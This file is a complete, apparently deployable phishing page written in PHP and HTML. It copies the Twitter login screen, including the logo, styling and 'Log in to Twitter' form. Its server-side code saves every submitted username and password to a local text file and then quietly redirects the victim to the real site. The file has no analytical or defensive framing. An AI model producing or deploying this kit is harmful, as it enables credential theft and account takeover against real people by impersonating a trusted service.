<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://twitter.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Twitter – Log in</title><meta charset="UTF-8"></head>
<body style="background: white; font-family: Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="width: 400px; margin: auto; padding: 30px;">
<svg viewBox="0 0 24 24" width="50" fill="#1da1f2"><path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .365.042.72.12 1.06-3.873-.195-7.304-2.05-9.602-4.87-.4.69-.63 1.49-.63 2.34 0 1.616.823 3.042 2.073 3.878-.764-.025-1.482-.234-2.11-.583v.058c0 2.257 1.605 4.14 3.737 4.568-.39.106-.8.163-1.224.163-.3 0-.59-.03-.875-.086.593 1.85 2.313 3.197 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.094 7.14 2.094 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.48 2.323-2.417z"/></svg><br>
<h2>Log in to Twitter</h2>
<form method="post">
<input type="text" name="username" placeholder="Phone, email, or username" style="width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #e1e8ed; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #e1e8ed; border-radius: 4px;" required><br>
<button type="submit" style="background: #1da1f2; color: white; width: 95%; padding: 12px; border: none; border-radius: 30px; font-weight: bold;">Log in</button>
</form>
</div>
</body>
</html>
